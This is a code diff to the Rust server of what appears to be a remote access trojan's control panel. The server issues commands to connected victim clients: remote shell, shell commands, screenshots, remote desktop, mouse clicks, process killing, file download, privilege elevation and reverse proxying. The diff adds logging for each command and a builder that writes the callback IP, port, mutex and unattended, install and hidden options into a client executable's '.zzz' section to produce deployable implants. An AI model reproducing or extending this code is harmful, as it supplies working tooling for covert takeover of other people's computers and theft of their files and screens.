@@ -26,6 +26,11 @@ use common::{ENC_TOK_LEN, RSA_BITS};
 
 use serde::Serialize;
 
+use object::{ Object, ObjectSection };
+use std::fs::{ self, File as FsFile };
+use std::io::Write;
+use rmp_serde::Serializer;
+
 #[derive(Debug, Clone, Serialize)]
 struct FrontClientNotification {
     pub username: String,
@@ -36,8 +41,6 @@ struct FrontClientNotification {
 pub struct Log {
     pub event_type: String,
     pub message: String,
-    pub address: String,
-    pub status: String,
 }
 
 #[derive(Debug, Clone)]
@@ -51,8 +54,8 @@ impl Logger {
         Self { logs: Vec::new(), tauri_handle: None }
     }
     
-    pub async fn log(&mut self, event_type: &str, message: &str, address: &str, status: &str) {
-        let log = Log { event_type: event_type.to_string(), message: message.to_string(), address: address.to_string(), status: status.to_string() };
+    pub async fn log(&mut self, event_type: &str, message: &str) {
+        let log = Log { event_type: event_type.to_string(), message: message.to_string() };
         self.logs.push(log.clone());
 
         if let Some(handle) = &self.tauri_handle {
@@ -133,7 +136,7 @@ impl ServerWrapper {
                     self.txs.clear();
                     self.connected_users.clear();
                     self.reverse_proxy_tasks.clear();
-                    self.log_events.log("server_stopped", "Server stopped", "0.0.0.0", "stopped").await;
+                    self.log_events.log("server_stopped", "Server stopped!").await;
                 }
                 EncryptionRequest(tx, otx) => {
                     let mut token = [0u8; ENC_TOK_LEN];
@@ -184,10 +187,17 @@ impl ServerWrapper {
                     self.txs.insert(addr, tx);
                     self.connected_users.insert(addr, client_info.clone());
                     
-                    self.log_events.log("client_connected", &client_info.username, &addr.to_string(), "connected").await;
+                    let message = format!("Client [{}] {} connected!", addr, client_info.username);
+
+                    self.log_events.log("client_connected", &message).await;
                     self.emit_client_status(&client_info.username, &addr, "client_connected").await;
                 }
                 VisitWebsite(addr, visit_data) => {
+                    let client = self.connected_users.get(&addr).unwrap();
+                    let message = format!("Run Visit Website on client [{}] [{}]", addr, client.username);
+
+                    self.log_events.log("cmd_sent", &message).await;
+
                     if let Some(tx) = self.txs.get(&addr) {
                         tx.send(ClientCommand::Write(ClientboundPacket::VisitWebsite(visit_data)))
                             .await
@@ -195,6 +205,11 @@ impl ServerWrapper {
                     }
                 }
                 ShowMessageBox(addr, message_box_data) => {
+                    let client = self.connected_users.get(&addr).unwrap();
+                    let message = format!("Run Show MessageBox on client [{}] [{}]", addr, client.username);
+
+                    self.log_events.log("cmd_sent", &message).await;
+
                     if let Some(tx) = self.txs.get(&addr) {
                         tx.send(ClientCommand::Write(ClientboundPacket::ShowMessageBox(message_box_data)))
                             .await
@@ -202,13 +217,23 @@ impl ServerWrapper {
                     }
                 }
                 ElevateClient(addr) => {
+                    let client = self.connected_users.get(&addr).unwrap();
+                    let message = format!("Run Elevate Client on client [{}] [{}]", addr, client.username);
+
+                    self.log_events.log("cmd_sent", &message).await;
+
                     if let Some(tx) = self.txs.get(&addr) {
                         tx.send(ClientCommand::Write(ClientboundPacket::ElevateClient))
                             .await
                             .unwrap_or_else(|e| println!("Failed to send elevate client request: {}", e));
                     }
                 }
-                ScreenshotData(_addr, screenshot_data) => {                    
+                ScreenshotData(addr, screenshot_data) => { 
+                    let client = self.connected_users.get(&addr).unwrap();
+                    let message = format!("Received screenshot from client [{}] [{}]", addr, client.username);
+
+                    self.log_events.log("cmd_rcvd", &message).await;
+
                     let base64_img = general_purpose::STANDARD.encode(&screenshot_data);
                     
                     if let Some(handle) = &self.tauri_handle {
@@ -218,6 +243,11 @@ impl ServerWrapper {
                     }
                 }
                 TakeScreenshot(addr, display) => {
+                    let client = self.connected_users.get(&addr).unwrap();
+                    let message = format!("Run Take Screenshot on client [{}] [{}]", addr, client.username);
+
+                    self.log_events.log("cmd_sent", &message).await;
+
                     if let Some(tx) = self.txs.get(&addr) {
                         tx.send(ClientCommand::Write(ClientboundPacket::ScreenshotDisplay(display)))
                             .await
@@ -225,6 +255,11 @@ impl ServerWrapper {
                     }
                 }
                 GetProcessList(addr) => {
+                    let client = self.connected_users.get(&addr).unwrap();
+                    let message = format!("Run Get Process List on client [{}] [{}]", addr, client.username);
+
+                    self.log_events.log("cmd_sent", &message).await;
+
                     if let Some(tx) = self.txs.get(&addr) {
                         tx.send(ClientCommand::Write(ClientboundPacket::GetProcessList))
                             .await
@@ -232,6 +267,11 @@ impl ServerWrapper {
                     }
                 }
                 ProcessList(addr, process_list) => {
+                    let client = self.connected_users.get(&addr).unwrap();
+                    let message = format!("Received process list from client [{}] [{}]", addr, client.username);
+
+                    self.log_events.log("cmd_rcvd", &message).await;
+
                     let payload = serde_json::json!({
                         "addr": addr.to_string(),
                         "processes": process_list.processes.clone()
@@ -244,6 +284,11 @@ impl ServerWrapper {
                     }
                 }
                 KillProcess(addr, process) => {
+                    let client = self.connected_users.get(&addr).unwrap();
+                    let message = format!("Run Kill Process on client [{}] [{}]", addr, client.username);
+
+                    self.log_events.log("cmd_sent", &message).await;
+
                     if let Some(tx) = self.txs.get(&addr) {
                         tx.send(ClientCommand::Write(ClientboundPacket::KillProcess(process)))
                             .await
@@ -251,6 +296,11 @@ impl ServerWrapper {
                     }
                 }
                 StartShell(addr) => {
+                    let client = self.connected_users.get(&addr).unwrap();
+                    let message = format!("Run Start Shell on client [{}] [{}]", addr, client.username);
+
+                    self.log_events.log("cmd_sent", &message).await;
+
                     if let Some(tx) = self.txs.get(&addr) {
                         tx.send(ClientCommand::Write(ClientboundPacket::StartShell))
                             .await
@@ -258,6 +308,11 @@ impl ServerWrapper {
                     }
                 }
                 ExitShell(addr) => {
+                    let client = self.connected_users.get(&addr).unwrap();
+                    let message = format!("Run Exit Shell on client [{}] [{}]", addr, client.username);
+
+                    self.log_events.log("cmd_sent", &message).await;
+
                     if let Some(tx) = self.txs.get(&addr) {
                         tx.send(ClientCommand::Write(ClientboundPacket::ExitShell))
                             .await
@@ -265,6 +320,11 @@ impl ServerWrapper {
                     }
                 }
                 ShellCommand(addr, command) => {
+                    let client = self.connected_users.get(&addr).unwrap();
+                    let message = format!("Run Shell Command on client [{}] [{}]", addr, client.username);
+
+                    self.log_events.log("cmd_sent", &message).await;
+
                     if let Some(tx) = self.txs.get(&addr) {
                         tx.send(ClientCommand::Write(ClientboundPacket::ShellCommand(command)))
                             .await
@@ -272,6 +332,11 @@ impl ServerWrapper {
                     }
                 }
                 ShellOutput(addr, output) => {
+                    let client = self.connected_users.get(&addr).unwrap();
+                    let message = format!("Received shell output from client [{}] [{}]", addr, client.username);
+
+                    self.log_events.log("cmd_rcvd", &message).await;
+
                     let payload = serde_json::json!({
                         "addr": addr.to_string(),
                         "shell_output": output.clone()
@@ -284,6 +349,11 @@ impl ServerWrapper {
                     }
                 }
                 StartRemoteDesktop(addr, config) => {
+                    let client = self.connected_users.get(&addr).unwrap();
+                    let message = format!("Run Start Remote Desktop on client [{}] [{}]", addr, client.username);
+
+                    self.log_events.log("cmd_sent", &message).await;
+
                     if let Some(tx) = self.txs.get(&addr) {
                         tx.send(ClientCommand::Write(ClientboundPacket::StartRemoteDesktop(config)))
                             .await
@@ -291,6 +361,11 @@ impl ServerWrapper {
                     }
                 }
                 StopRemoteDesktop(addr) => {
+                    let client = self.connected_users.get(&addr).unwrap();
+                    let message = format!("Run Stop Remote Desktop on client [{}] [{}]", addr, client.username);
+
+                    self.log_events.log("cmd_sent", &message).await;
+
                     if let Some(tx) = self.txs.get(&addr) {
                         tx.send(ClientCommand::Write(ClientboundPacket::StopRemoteDesktop))
                             .await
@@ -298,6 +373,11 @@ impl ServerWrapper {
                     }
                 }  
                 MouseClick(addr, click_data) => {
+                    let client = self.connected_users.get(&addr).unwrap();
+                    let message = format!("Run Mouse Click on client [{}] [{}]", addr, client.username);
+
+                    self.log_events.log("cmd_sent", &message).await;
+
                     if let Some(tx) = self.txs.get(&addr) {
                         tx.send(ClientCommand::Write(ClientboundPacket::MouseClick(click_data)))
                             .await
@@ -325,6 +405,7 @@ impl ServerWrapper {
                     
                     for (addr, client_info) in self.connected_users.iter() {
                         clients.push(crate::handlers::FrontClient {
+                            group: client_info.group.clone(),
                             addr: addr.clone(),
                             username: client_info.username.clone(),
                             hostname: client_info.hostname.clone(),
@@ -345,6 +426,7 @@ impl ServerWrapper {
                 GetClient(addr, resp) => {
                     if let Some(client_info) = self.connected_users.get(&addr) {
                         let front_client = crate::handlers::FrontClient {
+                            group: client_info.group.clone(),
                             addr: addr.clone(),
                             username: client_info.username.clone(),
                             hostname: client_info.hostname.clone(),
@@ -375,7 +457,11 @@ impl ServerWrapper {
                         let username = client_info.username.clone();
                         println!("Emitting client_disconnected event for {}", username);
                         self.emit_client_status(&username, &addr, "client_disconnected").await;
-                        self.log_events.log("client_disconnected", &username, &addr.to_string(), "disconnected").await;
+                        println!("emitted");
+                        let message = format!("Client [{}] {} disconnected!", addr, username);
+                        self.log_events.log("client_disconnected", &message).await;
+
+                        println!("crashed?");
                     }
                     
                     self.connected_users.remove(&addr);
@@ -396,6 +482,11 @@ impl ServerWrapper {
                     }
                 }
                 ManageSystem(addr, command) => {
+                    let client = self.connected_users.get(&addr).unwrap();
+                    let message = format!("Run [{}] on client [{}] [{}]", command, addr, client.username);
+
+                    self.log_events.log("cmd_sent", &message).await;
+
                     if let Some(tx) = self.txs.get(&addr) {
                         tx.send(ClientCommand::Write(ClientboundPacket::ManageSystem(command)))
                             .await
@@ -444,6 +535,11 @@ impl ServerWrapper {
                 }
 
                 DownloadFile(addr, path) => {
+                    let client = self.connected_users.get(&addr).unwrap();
+                    let message = format!("Run Download File on client [{}] [{}]", addr, client.username);
+
+                    self.log_events.log("cmd_sent", &message).await;
+
                     if let Some(tx) = self.txs.get(&addr) {
                         tx.send(ClientCommand::Write(ClientboundPacket::DownloadFile(path)))
                             .await
@@ -502,10 +598,20 @@ impl ServerWrapper {
                 }
                 
                 DownloadFileResult(addr, file_data) => {
+                    let client = self.connected_users.get(&addr).unwrap();
+                    let message = format!("Downloaded file from client [{}] [{}]", addr, client.username);
+
+                    self.log_events.log("cmd_rcvd", &message).await;
+
                     let _ = std::fs::write(file_data.name, file_data.data);
                 }
 
                 StartReverseProxy(addr, port, local_port) => {
+                    let client = self.connected_users.get(&addr).unwrap();
+                    let message = format!("Run Start Reverse Proxy on client [{}] [{}]", addr, client.username);
+
+                    self.log_events.log("cmd_sent", &message).await;
+
                     if let Some(tx) = self.txs.get(&addr) {
                         tx.send(ClientCommand::Write(ClientboundPacket::StartReverseProxy(port.clone())))
                             .await
@@ -620,6 +726,11 @@ impl ServerWrapper {
                 }
 
                 StopReverseProxy(addr) => {
+                    let client = self.connected_users.get(&addr).unwrap();
+                    let message = format!("Run Stop Reverse Proxy on client [{}] [{}]", addr, client.username);
+
+                    self.log_events.log("cmd_sent", &message).await;
+
                     if let Some(tx) = self.txs.get(&addr) {
                         tx.send(ClientCommand::Write(ClientboundPacket::StopReverseProxy))
                             .await
@@ -631,6 +742,46 @@ impl ServerWrapper {
                     }
 
                     self.reverse_proxy_tasks.remove(&addr);
+                }
+
+                BuildClient(ip, port, mutex_enabled, mutex, unattended_mode) => {
+                    let bin_data = fs::read("target/debug/client.exe").unwrap();
+                    let file = object::File::parse(&*bin_data).unwrap();
+
+                    let mut output_data = bin_data.clone();
+
+                    let config = common::ClientConfig {
+                        ip: ip.to_string(),
+                        port: port.to_string(),
+                        mutex_enabled,
+                        mutex: mutex.to_string(),
+                        unattended_mode,
+                        group: "Default".to_string(),
+                        install: false,
+                        file_name: "".to_string(),
+                        install_folder: "".to_string(),
+                        enable_hidden: false,
+                    };
+
+                    let mut buffer: Vec<u8> = Vec::new();
+
+                    config.serialize(&mut Serializer::new(&mut buffer)).unwrap();
+
+                    let mut new_data = vec![0u8; 1024];
+
+                    for (i, byte) in buffer.iter().enumerate() {
+                        new_data[i] = *byte;
+                    }
+
+                    if let Some(section) = file.section_by_name(".zzz") {
+                        let offset = section.file_range().unwrap().0 as usize;
+                        let size = section.size() as usize;
+
+                        output_data[offset..offset + size].copy_from_slice(&new_data);
+                    }
+
+                    let mut file = FsFile::create("target/debug/Client_built.exe").unwrap();
+                    let _ = file.write_all(&output_data);
                 }
 
 
